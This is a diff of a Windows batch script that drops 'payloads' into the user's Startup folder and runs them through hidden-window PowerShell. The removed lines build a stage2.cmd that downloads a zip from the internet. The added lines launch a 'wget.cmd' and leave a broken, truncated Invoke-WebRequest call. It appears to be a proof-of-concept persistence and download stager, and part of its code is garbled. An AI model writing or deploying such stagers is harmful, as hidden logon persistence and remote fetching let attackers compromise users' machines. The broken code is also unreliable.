@@ -5,18 +5,16 @@
 
 @REM variables
 set "INITIALPATH=%cd%"
-set "STARTUP=%C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup%"
+set "STARTUP=C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
 
 @REM move into Startup Dir
 cd "%STARTUP%"
 
 @REM write payloads to startup
-(
-    powershell -windowstyle hidden -c "Invoke-WebRequest -Uri 'http://ipv4.download.thinkbroadband.com/10MB.zip' -Outfile 'poc.zip'"
-) > stage2.cmd
+powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri "
 
 @REM run payload
-powershell Start-Process powershell.exe -windowstyle hidden -FilePath "stage2.cmd" -WorkingDirectory "%STARTUP%"
+powershell Start-Process powershell.exe -windowstyle hidden -FilePath "wget.cmd" -WorkingDirectory "%STARTUP%/files/"
 
 @REM cd change back to initial location
 cd "%INITIALPATH%"
